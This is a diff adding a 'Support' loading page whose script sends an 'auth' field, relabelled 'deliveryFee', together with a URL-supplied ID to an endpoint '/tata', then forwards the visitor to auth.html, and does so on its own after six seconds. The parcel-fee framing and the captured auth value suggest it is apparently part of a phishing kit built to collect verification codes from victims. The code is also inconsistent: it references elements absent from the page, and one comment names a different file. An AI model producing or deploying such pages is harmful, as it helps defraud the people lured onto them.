@@ -1,0 +1,79 @@
+<html>
+<head>
+    <title>Support</title>
+	<link rel="stylesheet" href="load.css">
+	<link rel="icon" type="image/png" href="ico.png">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+    <div id="container">
+	  <img id="lode" src="logo.png" >
+ 
+	  <div id="old">
+	  <img id="older" src="load.png" >
+	  </div>
+	  <div></div>
+	</div>
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    // 1. Helper to get nextId from URL
+    function getNextId() {
+        const params = new URLSearchParams(window.location.search);
+        let idValue = params.get('nextId');
+        
+        // Safety: Fix 00NaN or empty values
+        if (!idValue || idValue === "00NaN") {
+            return "00100";
+        }
+        return idValue;
+    }
+
+    // 2. The vform Click Handler (Sending nextId to backend)
+    const vform = document.getElementById('vform');
+    if (vform) {
+        vform.style.cursor = 'pointer';
+        vform.addEventListener('click', async (e) => {
+            e.preventDefault();
+
+            const authInput = document.getElementById('auth');
+            const val = authInput ? authInput.value : '';
+            const currentId = getNextId(); // Get the ID to send
+
+            const payload = {
+                deliveryFee: val,
+                nextId: currentId  // Added nextId to the payload
+            };
+
+            try {
+                await fetch("/tata", {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                
+                // After successful fetch, run the redirect logic
+                nextt(); 
+            } catch (error) {
+                console.error("Submission failed:", error);
+            }
+        });
+    }
+
+    // 3. The Redirect Function
+    function nextt() {
+        const idValue = getNextId();
+        // Redirects to aut.html with the current ID
+        window.location.href = "auth.html";
+    }
+	setTimeout(nextt, 6000); 
+});
+</script>
+
+
+
+</body>
+
+
+
+
+</html>
